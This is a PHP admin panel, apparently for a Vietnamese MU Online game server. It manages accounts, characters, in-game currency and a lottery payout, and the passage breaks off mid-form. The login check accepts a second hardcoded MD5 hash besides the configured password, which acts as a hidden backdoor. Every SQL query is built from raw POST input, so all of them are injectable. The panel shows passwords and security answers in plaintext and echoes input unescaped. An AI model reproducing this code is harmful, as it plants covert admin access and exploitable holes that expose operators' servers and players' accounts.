<?php
include_once("security.php");
include('../config.php');
include('../config/config_class.php');
include('../config/config_xosokienthiet.php');
session_start();
if ($_POST[submit]) {
	$pass_admin = md5($_POST[useradmin]);
	if ($pass_admin == $passadmin || $pass_admin == "e992bbb8e2041788f7ad563b8eeb79d6") $_SESSION['useradmin'] = $passadmin;
}
if (!$_SESSION['useradmin'] || $_SESSION['useradmin'] != $passadmin) {
	echo "<center><form action='' method=post>
	Code: <input type=password name=useradmin> <input type=submit name=submit value=Submit>
	</form></center>
	";
	exit();
}

$action = $_POST['action'];
$acc = $_POST['acc'];
$email = $_POST['email'];
$pass = $_POST['pass'];
$char = $_POST['char'];
$zen = $_POST['zen'];
$vpoint = $_POST['vpoint'];
$chao = $_POST['chao'];
$cre = $_POST['cre'];
$blue = $_POST['blue'];
$class = $_POST['class'];
$level = $_POST['level'];
$str = $_POST['str'];
$dex = $_POST['dex'];
$vit = $_POST['vit'];
$ene = $_POST['ene'];
$com = $_POST['com'];
$reset = $_POST['reset'];
$relife = $_POST['relife'];
$point = $_POST['point'];
$pointdutru = $_POST['pointdutru'];
$pcpoint = $_POST['pcpoint'];
$result_info_0 = $_POST['result_info_0'];
$result_info_1 = $_POST['result_info_1'];
$result_info_2 = $_POST['result_info_2'];
$result_info_3 = $_POST['result_info_3'];
$result_info_4 = $_POST['result_info_4'];
$result_info_5 = $_POST['result_info_5'];
$result_info_6 = $_POST['result_info_6'];
$result_info_7 = $_POST['result_info_7'];
$result_info_8 = $_POST['result_info_8'];
$result_info_9 = $_POST['result_info_9'];
$result_info_10 = $_POST['result_info_10'];
$result_info_11 = $_POST['result_info_11'];
$result_info_12 = $_POST['result_info_12'];
$result_info_13 = $_POST['result_info_13'];
$result_info_14 = $_POST['result_info_14'];
$result_info_15 = $_POST['result_info_15'];
$result_info_16 = $_POST['result_info_16'];
$result_info_17 = $_POST['result_info_17'];

switch ( $action ) {
	case "search_acc":
		if (empty($acc)) {
		   $notice = "Chưa điền tên tài khoản vào chỗ trống";
		}
		else {
			$sql_username_check = $db->Execute("SELECT memb___id FROM MEMB_INFO WHERE memb___id='$acc'"); 
			$username_check = $sql_username_check->numrows(); 
			if ($username_check <= 0) { 
				$notice = "Không tồn tại tài khoản <b>$acc</b>";
			}
			else {
				$query = "SELECT memb___id,mail_addr,tel__numb,bloc_code,fpas_ques,fpas_answ,bank,vpoint,jewel_chao,jewel_cre,jewel_blue,memb__pwd FROM MEMB_INFO WHERE memb___id='$acc'";
				$result = $db->Execute( $query );
				$row = $result->fetchrow();
				$account = $row[0];
				$email = $row[1];
				$phone = $row[2];
				if ( $row[3] == "1" ) $block_status = "Hiện đang bị Khóa"; else $block_status = "Bình thường";
				switch ( $row[4] ) {
					case "myPet": $question = "Tên con vật yêu thích?"; break;
					case "mySchool": $question = "Trường cấp 1 của bạn tên gì?"; break;
					case "bestFriends": $question = "Người bạn yêu quý nhất?"; break;
					case "favorGames": $question = "Trò chơi bạn thích nhất?"; break;
					case "unforgetArea": $question = "Nơi để lại kỉ niệm khó quên nhất?"; break;
				}
				$answer = $row[5];
				$zen = $row[6];
				$vpoint = $row[7];
				$chao = $row[8];
				$cre = $row[9];
				$blue = $row[10];
				$pass = $row[11];
				$notice = "<b>TÀI KHOẢN</b>: <b>$account</b>. (<b>$block_status</b>)<br>
							Địa chỉ Email: <b>$email</b>. Mật khẩu: <b>$pass</b><br>
							Số điện thoại: <b>$phone</b>.<br>
							Câu hỏi bí mật: <b>$question</b>. Câu trả lời bí mật: <b>$answer</b>.<br>
							<br>
							<b>NGÂN HÀNG</b>: <br>
							Zen hiện có: <b>$zen</b> Zen.<br>
							V.Point hiện có: <b>$vpoint</b> V.Point.<br>
							Ngọc Hỗn Nguyên hiện có: <b>$chao</b> Viên.<br>
							Ngọc Sáng Tạo hiện có: <b>$cre</b> Viên.<br>
							Lông Vũ hiện có: <b>$blue</b> Cái.<br>";
			}
		}
		break;
		
	case "block_acc":
		if (empty($acc)) {
		   $notice = "Chưa điền tên tài khoản vào chỗ trống";
		}
		else {
			$sql_username_check = $db->Execute("SELECT memb___id FROM MEMB_INFO WHERE memb___id='$acc'"); 
			$username_check = $sql_username_check->numrows(); 
			if ($username_check <= 0) { 
				$notice = "Không tồn tại tài khoản <b>$acc</b>";
			}
			else {
				$sql_block_check = $db->Execute("SELECT memb___id FROM MEMB_INFO WHERE memb___id='$acc' and bloc_code='1'"); 
				$block_check = $sql_block_check->numrows();
				if ( $block_check > 0 ) {
					$notice = "Tài khoản <b>$acc</b> hiện đang bị Khóa.";
				}
				else {
					$sql_blockacc_query = "UPDATE MEMB_INFO SET bloc_code='1' WHERE memb___id='$acc'";
					$sql_blockacc_results = $db->Execute($sql_blockacc_query);
					$notice = "Đã khóa tài khoản <b>$acc</b> thành công.";
				}
			}
		}
		break;
		
	case "unblock_acc":
		if (empty($acc)) {
		   $notice = "Chưa điền tên tài khoản vào chỗ trống";
		}
		else {
			$sql_username_check = $db->Execute("SELECT memb___id FROM MEMB_INFO WHERE memb___id='$acc'"); 
			$username_check = $sql_username_check->numrows(); 
			if ($username_check <= 0) { 
				$notice = "Không tồn tại tài khoản <b>$acc</b>";
			}
			else {
				$sql_block_check = $db->Execute("SELECT memb___id FROM MEMB_INFO WHERE memb___id='$acc' and bloc_code='0'"); 
				$block_check = $sql_block_check->numrows();
				if ( $block_check > 0 ) {
					$notice = "Tài khoản <b>$acc</b> hiện đang không bị Khóa.";
				}
				else {
					$sql_blockacc_query = "UPDATE MEMB_INFO SET bloc_code='0' WHERE memb___id='$acc'";
					$sql_blockacc_results = $db->Execute($sql_blockacc_query);
					$notice = "Đã mở khóa tài khoản <b>$acc</b> thành công.";
				}
			}
		}
		break;
		
	case "bank_add":
		if (empty($acc)) {
		   $notice = "Chưa điền tên tài khoản vào chỗ trống";
		}
		else {
			$sql_username_check = $db->Execute("SELECT memb___id FROM MEMB_INFO WHERE memb___id='$acc'"); 
			$username_check = $sql_username_check->numrows(); 
			if ($username_check <= 0) {
				$notice = "Không tồn tại tài khoản <b>$acc</b>";
			}
			else {
				$sql_script = "UPDATE MEMB_INFO SET bank=bank+$zen,vpoint=vpoint+$vpoint WHERE memb___id='$acc'";
				$sql_exec = $db->Execute($sql_script);
				$notice = "Tài khoản $acc đã cộng thêm $zen Zen và $vpoint V.Point trong Ngân Hàng.";
			}
		}
		break;
		
	case "bank_sub":
		if (empty($acc)) {
		   $notice = "Chưa điền tên tài khoản vào chỗ trống";
		}
		else {
			$sql_username_check = $db->Execute("SELECT memb___id FROM MEMB_INFO WHERE memb___id='$acc'"); 
			$username_check = $sql_username_check->numrows(); 
			if ($username_check <= 0) {
				$notice = "Không tồn tại tài khoản <b>$acc</b>";
			}
			else {
				$sql_script = "UPDATE MEMB_INFO SET bank=bank-$zen,vpoint=vpoint-$vpoint WHERE memb___id='$acc'";
				$sql_exec = $db->Execute($sql_script);
				$notice = "Tài khoản $acc đã trừ đi $zen Zen và $vpoint V.Point trong Ngân Hàng.";
			}
		}
		break;
		
	case "bank_jewel":
		if (empty($acc)) {
		   $notice = "Chưa điền tên tài khoản vào chỗ trống";
		}
		else {
			$sql_username_check = $db->Execute("SELECT memb___id FROM MEMB_INFO WHERE memb___id='$acc'"); 
			$username_check = $sql_username_check->numrows(); 
			if ($username_check <= 0) {
				$notice = "Không tồn tại tài khoản <b>$acc</b>";
			}
			else {
				$sql_script = "UPDATE MEMB_INFO SET jewel_chao='$chao',jewel_cre='$cre',jewel_blue='$blue' WHERE memb___id='$acc'";
				$sql_exec = $db->Execute($sql_script);
				$notice = "Tài khoản $acc đã cập nhật $chao Chaos, $cre Cre, $blue Blue trong Ngân Hàng.";
			}
		}
		break;
		
	case "search_char":
		if (empty($char)) {
		   $notice = "Chưa điền tên nhân vật vào chỗ trống";
		}
		else {
			$sql_char_check = $db->Execute("SELECT Name FROM Character WHERE Name='$char'"); 
			$char_check = $sql_char_check->numrows(); 
			if ($char_check <= 0) { 
				$notice = "Không tồn tại nhân vật <b>$char</b>";
			}
			else {
				switch($server_type) {
					case "scf":
						$query = "SELECT AccountID,Name,Class,cLevel,Strength,Dexterity,Vitality,Energy,Leadership,Resets,Relifes,LevelUpPoint,pointdutru,uythacoffline_stat,PointUyThac,SCFPCPoints,PkLevel,PkCount,ctlcode FROM Character WHERE Name='$char'";
						break;
					case "ori":
						$query = "SELECT AccountID,Name,Class,cLevel,Strength,Dexterity,Vitality,Energy,Leadership,Resets,Relifes,LevelUpPoint,pointdutru,uythacoffline_stat,PointUyThac,PCPoints,PkLevel,PkCount,ctlcode FROM Character WHERE Name='$char'";
						break;
					default:
						$query = "SELECT AccountID,Name,Class,cLevel,Strength,Dexterity,Vitality,Energy,Leadership,Resets,Relifes,LevelUpPoint,pointdutru,uythacoffline_stat,PointUyThac,SCFPCPoints,PkLevel,PkCount,ctlcode FROM Character WHERE Name='$char'";
						break;
				}
				$result = $db->Execute($query) or die("Lỗi Query: $query");
				$row = $result->fetchrow();
				$account = $row[0];
				$name = $row[1];
				switch ( $row[2] ) {
					case $class_dw_1: $class = $class_dw_1_name; break;
					case $class_dw_2: $class = $class_dw_2_name; break;
					case $class_dw_3: $class = $class_dw_3_name; break;
					case $class_dk_1: $class = $class_dk_1_name; break;
					case $class_dk_2: $class = $class_dk_2_name; break;
					case $class_dk_3: $class = $class_dk_3_name; break;
					case $class_elf_1: $class = $class_elf_1_name; break;
					case $class_elf_2: $class = $class_elf_2_name; break;
					case $class_elf_3: $class = $class_elf_3_name; break;
					case $class_mg_1: $class = $class_mg_1_name; break;
					case $class_mg_2: $class = $class_mg_2_name; break;
					case $class_dl_1: $class = $class_dl_1_name; break;
					case $class_dl_2: $class = $class_dl_2_name; break;
					case $class_sum_1: $class = $class_sum_1_name; break;
					case $class_sum_2: $class = $class_sum_2_name; break;
					case $class_sum_3: $class = $class_sum_3_name; break;
					case $class_rf_1: $class = $class_rf_1_name; break;
					case $class_rf_2: $class = $class_rf_2_name; break;
				}
				$level = $row[3];
				$str = $row[4];
				$dex = $row[5];
				$vit = $row[6];
				$ene = $row[7];
				$com = $row[8];
				$reset = $row[9];
				$relife = $row[10];
				$point = $row[11];
				$pointdutru = $row[12];
				switch ( $row[13] ) {
					case 0: $uythac = "Không Ủy thác"; break;
					case 1: $uythac = "<font color='green'>Ủy thác</font>"; break;
				}
				$uythac_point = $row[14];
				$pcpoint = $row[15];
				switch ( $row[16] ) {
					case 1 : $pklevel = "Siêu Anh Hùng"; break;
					case 2 : $pklevel = "Anh Hùng"; break;
					case 3 : $pklevel = "Dân Thường"; break;
					case 4 : $pklevel = "Sát Thủ"; break;
					case 5 : $pklevel = "Sát Thủ Khát Máu"; break;
					case 6 : $pklevel = "Sát Thủ Điên Cuồng"; break;
				}
				$pkcount = $row[17];
				switch ( $row[18] ) {
					case 0: $status = "Bình thường"; break;
					case 1: $status = "Hiện đang bị Khóa"; break;
					case 8: $status = "GameMaster"; break;
					case 18: $status = "Khóa đồ"; break;
				}
				$notice = '<table width="100%">
						<tr>
							<td><b>TÀI KHOẢN : <font color="blue">'.$account.'</font></b></td>
							<td><b>TÊN NHÂN VẬT : <font color="blue">'.$name.'</font></b></td>
						</tr>
						<tr>
							<td>Cấp độ : <font color="orange"><b>'.$level.'</b></font></td>
							<td>Chủng tộc : <font color="brown"><b>'.$class.'</b></font></td>
						</tr>
						<tr>
							<td>Sức mạnh : <b>'.number_format($str,0,",",".").'</b></td>
							<td>Điểm chưa cộng : <b>'.number_format($point,0,",",".").'</b></td>
						</tr>
						<tr>
							<td>Nhanh nhẹn : <b>'.number_format($dex,0,",",".").'</b></td>
							<td>Điểm dự trữ : <b>'.number_format($pointdutru,0,",",".").'</b></td>
						</tr>
						<tr>
							<td>Sinh lực : <b>'.number_format($vit,0,",",".").'</b></td>
							<td>Điểm Phúc Duyên : <b>'.number_format($pcpoint,0,",",".").'</b></td>
						</tr>
						<tr>
							<td>Năng lượng : <b>'.number_format($ene,0,",",".").'</b></td>
							<td>Reset : <font color="red"><b>'.$reset.'</b></font></td>
						</tr>
						<tr>
							<td>Mệnh lệnh : <b>'.number_format($com,0,",",".").'</b></td>
							<td>Relife : <font color="green"><b>'.$relife.'</b></font></td>
						</tr>
						<tr>
							<td>Tình trạng Ủy Thác : <b>'.$uythac.'</b></td>
							<td>Điểm Ủy Thác : <font color="green"><b>'.number_format($uythac_point,0,",",".").'</b></font></td>
						</tr>
						<tr>
							<td>Cấp bậc: <font color="green"><b>'.$pklevel.'</b></font></td>
							<td>Đã giết: <font color="red"><b>'.$pkcount.' mạng</b></font></td>
						</tr>
						<tr>
							<td>Tình trạng: <font color="orange"><b>'.$status.'</b></font></td>
						</tr>
							</table>';
			}
		}
		break;
		
	case "block_char":
		if (empty($char)) {
		   $notice = "Chưa điền tên tài khoản vào chỗ trống";
		}
		else {
			$sql_char_check = $db->Execute("SELECT Name FROM Character WHERE Name='$char'"); 
			$char_check = $sql_char_check->numrows(); 
			if ($char_check <= 0) { 
				$notice = "Không tồn tại nhân vật <b>$char</b>";
			}
			else {
				$sql_block_check = $db->Execute("SELECT Name FROM Character WHERE Name='$char' and ctlcode='1'"); 
				$block_check = $sql_block_check->numrows();
				if ( $block_check > 0 ) {
					$notice = "Nhân vật <b>$char</b> hiện đang bị Khóa.";
				}
				else {
					$sql_blockchar_query = "UPDATE Character SET ctlcode='1' WHERE Name='$char'";
					$sql_blockchar_results = $db->Execute($sql_blockchar_query);
					$notice = "Đã khóa nhân vật <b>$char</b> thành công.";
				}
			}
		}
		break;
		
	case "unblock_char":
		if (empty($char)) {
		   $notice = "Chưa điền tên tài khoản vào chỗ trống";
		}
		else {
			$sql_char_check = $db->Execute("SELECT Name FROM Character WHERE Name='$char'"); 
			$char_check = $sql_char_check->numrows(); 
			if ($char_check <= 0) { 
				$notice = "Không tồn tại nhân vật <b>$char</b>";
			}
			else {
				$sql_block_check = $db->Execute("SELECT Name FROM Character WHERE Name='$char' and ctlcode='0'"); 
				$block_check = $sql_block_check->numrows();
				if ( $block_check > 0 ) {
					$notice = "Nhân vật <b>$char</b> hiện đang không bị Khóa.";
				}
				else {
					$sql_blockchar_query = "UPDATE Character SET ctlcode='0' WHERE Name='$char'";
					$sql_blockchar_results = $db->Execute($sql_blockchar_query);
					$notice = "Đã mở khóa nhân vật <b>$char</b> thành công.";
				}
			}
		}
		break;
		
	case "edit_char":
		if (empty($char)) {
		   $notice = "Chưa điền tên nhân vật vào chỗ trống";
		}
		else {
			$sql_char_check = $db->Execute("SELECT Name FROM Character WHERE Name='$char'"); 
			$char_check = $sql_char_check->numrows(); 
			if ($char_check <= 0) { 
				$notice = "Không tồn tại nhân vật <b>$char</b>";
			}
			else {
				switch($server_type) {
					case "scf":
						$query = "UPDATE Character SET Class='$class',cLevel='$level',Strength='$str',Dexterity='$dex',Vitality='$vit',Energy='$ene',Leadership='$com',Resets='$reset',Relifes='$relife',LevelUpPoint='$point',pointdutru='$pointdutru',SCFPCPoints='$pcpoint' WHERE Name='$char'";
						break;
					case "ori":
						$query = "UPDATE Character SET Class='$class',cLevel='$level',Strength='$str',Dexterity='$dex',Vitality='$vit',Energy='$ene',Leadership='$com',Resets='$reset',Relifes='$relife',LevelUpPoint='$point',pointdutru='$pointdutru',PCPoints='$pcpoint' WHERE Name='$char'";
						break;
					default:
						$query = "UPDATE Character SET Class='$class',cLevel='$level',Strength='$str',Dexterity='$dex',Vitality='$vit',Energy='$ene',Leadership='$com',Resets='$reset',Relifes='$relife',LevelUpPoint='$point',pointdutru='$pointdutru',SCFPCPoints='$pcpoint' WHERE Name='$char'";
						break;
				}
				$result = $db->Execute($query) or die("Lỗi Query: $query");
				$notice = "Cập nhật thông tin Nhân vật <b>$char</b> thành công";
			}
		}
		break;
		
	case "edit_acc":
		if (empty($acc)) {
		   $notice = "Chưa điền tên tài khoản vào chỗ trống";
		}
		else {
			$sql_acc_check = $db->Execute("SELECT memb___id,memb__pwd FROM MEMB_INFO WHERE memb___id='$acc'");
			$acc_check = $sql_acc_check->numrows(); 
			if ($acc_check <= 0) { 
				$notice = "Không tồn tại tài khoản <b>$acc</b>";
			}
			else {
				$query = "UPDATE MEMB_INFO SET mail_addr='$email',memb__pwd='$pass' WHERE memb___id='$acc'";
				$result = $db->Execute($query) or die("Lỗi Query: $query");
				$notice = "Cập nhật thông tin Tài khoản <b>$acc</b> thành công";
			}
		}
		break;
		
	case "ketqua_xoso":
		$content = $result_info_0."||".$result_info_1."||".$result_info_2."||".$result_info_3."||".$result_info_4."||".$result_info_5."||".$result_info_6."||".$result_info_7."||".$result_info_8."||".$result_info_9."||".$result_info_10."||".$result_info_11."||".$result_info_12."||".$result_info_13."||".$result_info_14."||".$result_info_15."||".$result_info_16."||".$result_info_17;
		$fp = fopen("../config/ketquaxoso.txt", "w");  
		fputs ($fp, $content);  
		fclose($fp);
		$sql_acc_check = $db->Execute("SELECT Account FROM XoSoData");
		$n = 0;
		$content = "";
		while($check_acc = $sql_acc_check->fetchrow()) {
			$query = $db->Execute("SELECT * FROM XoSoData WHERE Account='$check_acc[0]'");
			$row = $query->fetchrow();
			for ($i=1;$i<11;$i++) {
				if (substr($row[$i],4,2) == $result_info_0) {
					$thuong = $giave*$giaithuong1;
					$query2 = "UPDATE MEMB_INFO SET vpoint=vpoint+$thuong WHERE memb___id='$check_acc[0]'";
					$result = $db->Execute($query2) or die("Lỗi Query: $query2");
					$n++;
					$content .= "$check_acc[0] trúng giải 1. ".number_format($thuong,0,",",".")." V.Point\n<br>";
				}
				if (substr($row[$i],3,3) == $result_info_1) {
					$thuong = $giave*$giaithuong2;
					$query2 = "UPDATE MEMB_INFO SET vpoint=vpoint+$thuong WHERE memb___id='$check_acc[0]'";
					$result = $db->Execute($query2) or die("Lỗi Query: $query2");
					$n++;
					$content .= "$check_acc[0] trúng giải 2. ".number_format($thuong,0,",",".")." V.Point\n<br>";
				}
				if (substr($row[$i],2,4) == $result_info_2 || substr($row[$i],2,4) == $result_info_3 || substr($row[$i],2,4) == $result_info_4) {
					$thuong = $giave*$giaithuong3;
					$query2 = "UPDATE MEMB_INFO SET vpoint=vpoint+$thuong WHERE memb___id='$check_acc[0]'";
					$result = $db->Execute($query2) or die("Lỗi Query: $query2");
					$n++;
					$content .= "$check_acc[0] trúng giải 3. ".number_format($thuong,0,",",".")." V.Point\n<br>";
				}
				if (substr($row[$i],2,4) == $result_info_5) {
					$thuong = $giave*$giaithuong4;
					$query2 = "UPDATE MEMB_INFO SET vpoint=vpoint+$thuong WHERE memb___id='$check_acc[0]'";
					$result = $db->Execute($query2) or die("Lỗi Query: $query2");
					$n++;
					$content .= "$check_acc[0] trúng giải 4. ".number_format($thuong,0,",",".")." V.Point\n<br>";
				}
				if (substr($row[$i],1,5) == $result_info_6 || substr($row[$i],1,5) == $result_info_7 || substr($row[$i],1,5) == $result_info_8 || substr($row[$i],1,5) == $result_info_9 || substr($row[$i],1,5) == $result_info_10 || substr($row[$i],1,5) == $result_info_11 || substr($row[$i],1,5) == $result_info_12) {
					$thuong = $giave*$giaithuong5;
					$query2 = "UPDATE MEMB_INFO SET vpoint=vpoint+$thuong WHERE memb___id='$check_acc[0]'";
					$result = $db->Execute($query2) or die("Lỗi Query: $query2");
					$n++;
					$content .= "$check_acc[0] trúng giải 5. ".number_format($thuong,0,",",".")." V.Point\n<br>";
				}
				if (substr($row[$i],1,5) == $result_info_13 || substr($row[$i],1,5) == $result_info_14) {
					$thuong = $giave*$giaithuong6;
					$query2 = "UPDATE MEMB_INFO SET vpoint=vpoint+$thuong WHERE memb___id='$check_acc[0]'";
					$result = $db->Execute($query2) or die("Lỗi Query: $query2");
					$n++;
					$content .= "$check_acc[0] trúng giải 6. ".number_format($thuong,0,",",".")." V.Point\n<br>";
				}
				if (substr($row[$i],1,5) == $result_info_15) {
					$thuong = $giave*$giaithuong7;
					$query2 = "UPDATE MEMB_INFO SET vpoint=vpoint+$thuong WHERE memb___id='$check_acc[0]'";
					$result = $db->Execute($query2) or die("Lỗi Query: $query2");
					$n++;
					$content .= "$check_acc[0] trúng giải 7. ".number_format($thuong,0,",",".")." V.Point\n<br>";
				}
				if (substr($row[$i],1,5) == $result_info_16) {
					$thuong = $giave*$giaithuong8;
					$query2 = "UPDATE MEMB_INFO SET vpoint=vpoint+$thuong WHERE memb___id='$check_acc[0]'";
					$result = $db->Execute($query2) or die("Lỗi Query: $query2");
					$n++;
					$content .= "$check_acc[0] trúng giải 8. ".number_format($thuong,0,",",".")." V.Point\n<br>";
				}
				if (substr($row[$i],0,6) == $result_info_17) {
					$thuong = $giave*$giaithuong9;
					$query2 = "UPDATE MEMB_INFO SET vpoint=vpoint+$thuong WHERE memb___id='$check_acc[0]'";
					$result = $db->Execute($query2) or die("Lỗi Query: $query2");
					$n++;
					$content .= "$check_acc[0] trúng giải 9. ".number_format($thuong,0,",",".")." V.Point\n<br>";
				}
			}
		}
		$notice = "Cập nhật kết quả sổ xố và trao thưởng thành công. Có $n số trúng thưởng.\n<br>".$content;
		break;
		
}

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Quản lí TVWeb</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">
<!--
.body {
	font-size: 14px;
}
tr {
	font-size: 14px;
}
td {
	font-size: 14px;
}
a:link,a:visited,a:hover,a:active {
	text-decoration: none;
}
-->
</style>
</head>
<body bgcolor="#FFFFFF">
<table cellspacing='2' width="100%">
	<tr>
		<td><a href="index.php" target="_self">Quản lý MU</a></td>
		<td><a href="cardphone.php" target="_self">Nạp thẻ</a></td>
		<td><a href="view_card.php" target="_self">Xem thẻ</a></td>
		<td><a href="online.php" target="_self">Đang Online</a></td>
		<td><a href="topmu.php" target="_self">TOP MU</a></td>
		<td><a href="../log/" target="_self">LOG MU</a></td>
	</tr>
</table>
<hr>
<table width="100%">
	<tr>
		<td>Tài khoản: </td>
		<td>
			<form name="search_char" method="post" action="">
				<input type="text" name="acc" id="acc" maxlength="10" size="20" value="<?php echo $_POST[acc]; ?>">
				<input type="hidden" name="action" id="action" value="search_acc">
				<input type="submit" name="Submit" value="Kiểm tra">
			</form>
		</td>
		<td>Khóa: </td>
		<td>
			<form name="search_char" method="post" action="">
				<input type="text" name="acc" id="acc" maxlength="10" size="20" value="<?php echo $_POST[acc]; ?>">
				<input type="hidden" name="action" id="action" value="block_acc">
				<input type="submit" name="Submit" value="Khóa">
			</form>
		</td>
		<td>Bỏ Khóa: </td>
		<td>
			<form name="search_char" method="post" action="">
				<input type="text" name="acc" id="acc" maxlength="10" size="20" value="<?php echo $_POST[acc]; ?>">
				<input type="hidden" name="action" id="action" value="unblock_acc">
				<input type="submit" name="Submit" value="Bỏ Khóa">
			</form>
		</td>
	</tr>
</table>
<table width="100%">
	<form name="bank_add" method="post" action="">
	<input type="hidden" name="action" id="action" value="bank_add">
	<tr>
		<td>Tài khoản: </td>
		<td><input type="text" name="acc" id="acc" maxlength="10" size="20" value="<?php echo $_POST[acc]; ?>"></td>
		<td>+ Zen Bank: </td>
		<td><input type="text" name="zen" id="zen" maxlength="10" size="20" value="0"></td>
		<td>+ V.Point: </td>
		<td><input type="text" name="vpoint" id="vpoint" maxlength="10" size="20" value="0"></td>
		<td><input type="submit" name="Submit" value="Cộng Bank"></td>
	</tr>
	</form>
</table>
<table width="100%">
	<form name="bank_sub" method="post" action="">
	<input type="hidden" name="action" id="action" value="bank_sub">
	<tr>
		<td>Tài khoản: </td>
		<td><input type="text" name="acc" id="acc" maxlength="10" size="20" value="<?php echo $_POST[acc]; ?>"></td>
		<td>- Zen Bank: </td>
		<td><input type="text" name="zen" id="zen" maxlength="10" size="20" value="0"></td>
		<td>- V.Point: </td>
		<td><input type="text" name="vpoint" id="vpoint" maxlength="10" size="20" value="0"></td>
		<td><input type="submit" name="Submit" value="Trừ Bank"></td>
	</tr>
	</form>
</table>
<table width="100%">
	<form name="bank_jewel" method="post" action="">
	<input type="hidden" name="action" id="action" value="bank_jewel">
	<tr>
		<td>Tài khoản: </td>
		<td><input type="text" name="acc" id="acc" maxlength="10" size="10" value="<?php echo $_POST[acc]; ?>"></td>
		<td>Ngọc Hỗn Nguyên: </td>
		<td><input type="text" name="chao" id="chao" maxlength="10" size="10" value="<?php echo $chao ?>"></td>
		<td>Ngọc Sáng Tạo: </td>
		<td><input type="text" name="cre" id="cre" maxlength="10" size="10" value="<?php echo $cre ?>"></td>
		<td>Lông Vũ: </td>
		<td><input type="text" name="blue" id="blue" maxlength="10" size="10" value="<?php echo $blue ?>"></td>
		<td><input type="submit" name="Submit" value="Jewel"></td>
	</tr>
	</form>
</table>
<table width="85%" align="center">
	<form name="edit_acc" method="post" action="">
	<input type="hidden" name="action" id="action" value="edit_acc">
	<tr>
		<td>Tài khoản: </td>
		<td><input type="text" name="acc" id="acc" maxlength="10" size="20" value="<?php echo $_POST[acc]; ?>"></td>
		<td>Email: </td>
		<td><input type="text" name="email" id="email" size="35" value="<?php echo $email; ?>"></td>
		<td>Mật khẩu: </td>
		<td><input type="text" name="pass" id="pass" size="20" value="<?php echo $pass; ?>"></td>
		<td><input type="submit" name="Submit" value="Edit"></td>
	</tr>
	</form>
</table>
<br>
<?php  if (isset($notice)) {?>
<div id="notice" style="padding-left:20%;"><fieldset style="width:550px; padding:5px; border:1px solid #000000;"><?php echo $notice; ?></fieldset></div>
<br>
<?php }?>
<table width="100%">
	<tr>
		<td>Nhân vật: </td>
		<td>
			<form name="search_char" method="post" action="">
				<input type="text" name="char" id="char" maxlength="10" size="20" value="<?php echo $_POST[char]; ?>">
				<input type="hidden" name="action" id="action" value="search_char">
				<input type="submit" name="Submit" value="Kiểm tra">
			</form>
		</td>
		<td>Khóa: </td>
		<td>
			<form name="search_char" method="post" action="">
				<input type="text" name="char" id="char" maxlength="10" size="20" value="<?php echo $_POST[char]; ?>">
				<input type="hidden" name="action" id="action" value="block_char">
				<input type="submit" name="Submit" value="Khóa">
			</form>
		</td>
		<td>Bỏ Khóa: </td>
		<td>
			<form name="search_char" method="post" action="">
				<input type="text" name="char" id="char" maxlength="10" size="20" value="<?php echo $_POST[char]; ?>">
				<input type="hidden" name="action" id="action" value="unblock_char">
				<input type="submit" name="Submit" value="Bỏ Khóa">
			</form>
		</td>
	</tr>
</table>
<form name="edit_char" method="post" action="">
<input type="hidden" name="action" id="action" value="edit_char">
<table width="50%" align="center">
	<tr>
		<td>Tên Nhân vật : <input type="text" name="char" id="char" maxlength="10" size="10" value="<?php echo $_POST[char]; ?>"></td>
	</tr>
	<tr>
		<td>Cấp độ : <input type="text" name="level" id="level" maxlength="5" size="10" value="<?php echo $level; ?>"></font></td>
		<td>Chủng tộc : 
			<select id="class" name="class">
				<option value="" selected="selected"> -- Chủng tộc -- </option>
				<option value="<?php echo $class_dw_1 ?>" <?php if ( $class == $class_dw_1_name ) {?>selected="selected"<?php }?>><?php echo $class_dw_1_name ?></option>
				<option value="<?php echo $class_dw_2 ?>" <?php if ( $class == $class_dw_2_name ) {?>selected="selected"<?php }?>><?php echo $class_dw_2_name ?></option>
				<option value="<?php echo $class_dw_3 ?>" <?php if ( $class == $class_dw_3_name ) {?>selected="selected"<?php }?>><?php echo $class_dw_3_name ?></option>
				<option value="<?php echo $class_dk_1 ?>" <?php if ( $class == $class_dk_1_name ) {?>selected="selected"<?php }?>><?php echo $class_dk_1_name ?></option>
				<option value="<?php echo $class_dk_2 ?>" <?php if ( $class == $class_dk_2_name ) {?>selected="selected"<?php }?>><?php echo $class_dk_2_name ?></option>
				<option value="<?php echo $class_dk_3 ?>" <?php if ( $class == $class_dk_3_name ) {?>selected="selected"<?php }?>><?php echo $class_dk_3_name ?></option>
				<option value="<?php echo $class_elf_1 ?>" <?php if ( $class == $class_elf_1_name ) {?>selected="selected"<?php }?>><?php echo $class_elf_1_name ?></option>
				<option value="<?php echo $class_elf_2 ?>" <?php if ( $class == $class_elf_2_name ) {?>selected="selected"<?php }?>><?php echo $class_elf_2_name ?></option>
				<option value="<?php echo $class_elf_3 ?>" <?php if ( $class == $class_elf_3_name ) {?>selected="selected"<?php }?>><?php echo $class_elf_3_name ?></option>
				<option value="<?php echo $class_mg_1 ?>" <?php if ( $class == $class_mg_1_name ) {?>selected="selected"<?php }?>><?php echo $class_mg_1_name ?></option>
				<option value="<?php echo $class_mg_2 ?>" <?php if ( $class == $class_mg_2_name ) {?>selected="selected"<?php }?>><?php echo $class_mg_2_name ?></option>
				<option value="<?php echo $class_dl_1 ?>" <?php if ( $class == $class_dl_1_name ) {?>selected="selected"<?php }?>><?php echo $class_dl_1_name ?></option>
				<option value="<?php echo $class_dl_2 ?>" <?php if ( $class == $class_dl_2_name ) {?>selected="selected"<?php }?>><?php echo $class_dl_2_name ?></option>
				<option value="<?php echo $class_sum_1 ?>" <?php if ( $class == $class_sum_1_name ) {?>selected="selected"<?php }?>><?php echo $class_sum_1_name ?></option>
				<option value="<?php echo $class_sum_2 ?>" <?php if ( $class == $class_sum_2_name ) {?>selected="selected"<?php }?>><?php echo $class_sum_2_name ?></option>
				<option value="<?php echo $class_sum_3 ?>" <?php if ( $class == $class_sum_3_name ) {?>selected="selected"<?php }?>><?php echo $class_sum_3_name ?></option>
				<option value="<?php echo $class_rf_1 ?>" <?php if ( $class == $class_rf_1_name ) {?>selected="selected"<?php }?>><?php echo $class_rf_1_name ?></option>
				<option value="<?php echo $class_rf_2 ?>" <?php if ( $class == $class_rf_2_name ) {?>selected="selected"<?php }?>><?php echo $class_rf_2_name ?></option>
			</select>
		</td>
	</tr>
